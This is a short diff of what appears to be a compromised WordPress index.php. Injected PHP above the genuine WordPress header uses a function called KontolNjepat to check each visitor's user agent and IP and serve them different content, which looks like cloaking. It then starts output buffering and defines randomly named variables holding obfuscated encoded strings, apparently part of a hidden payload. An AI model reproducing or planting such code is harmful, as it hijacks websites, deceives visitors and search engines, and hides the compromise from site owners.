@@ -90,6 +90,7 @@ function getRealIP(){
 if(KontolNjepat($_SERVER['HTTP_USER_AGENT'], getRealIP())) {
     echo getContents($contents);
     exit;
+}
  @ob_start(); $aXIvxGToAShyxzmNYYBs='U98oeTV3sIRv792fH8bNxcNE4qK518GDCDBQwzdbrbQ1imaSv1fHLSLyD7C8GDaWagWaLwNg'; $PrJoxBPtcOdjQVfOnDyU='xNO0138AMWLmrYfLGfZppck3viIu210tQkfRJb4Z9+AzusLytSSbrWxLOGBLbkLhGMf+X+c69Qk='; $sANbmaZNlPFFusRrBzRr='gmVz5ui3T+QWcrEKlhGnmvBsMdZobZoc1fCvo07GwSG8XQzNjH8UWYktyj/sxFQN0KsC1VAXxg==';$LskfPFwBOUrtXPUvnFAz='DzwBiqfgBVgwbhayJXBOXNknXGViTNDGMBCCYXGxAtBJYoTOKF'; ?><?php 
 /**
  * Front to the WordPress application. This file doesn't do anything, but loads
